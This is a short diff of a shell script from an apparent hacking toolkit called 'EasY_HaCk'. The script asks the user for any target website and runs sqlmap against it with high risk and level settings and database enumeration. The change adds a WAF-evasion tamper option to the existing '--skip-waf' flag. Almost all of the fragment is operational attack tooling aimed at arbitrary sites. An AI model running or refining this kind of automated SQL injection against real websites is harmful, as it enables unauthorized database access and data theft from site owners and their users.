@@ -79,7 +79,7 @@ echo $C "      Please input the target website "
 echo $C "exemple :$W www.exemple.com/index.php?=1 "
 echo -n $R "Target or website$Y : " 
 read target
-python2 $PREFIX/share/EasY_HaCk/.modules/.sqlmap/sqlmap.py -u $target --skip-waf --risk=3 --level=4  --dbs --threads 3 --time-sec=10 --batch
+python2 $PREFIX/share/EasY_HaCk/.modules/.sqlmap/sqlmap.py -u $target --skip-waf --tamper=space2comment --risk=3 --level=4  --dbs --threads 2 --time-sec=10 --batch
 echo -n  $R"Press" ENTRE to back" " 
 read ENTRE
 $PREFIX/share/EasY_HaCk/.modules/.web
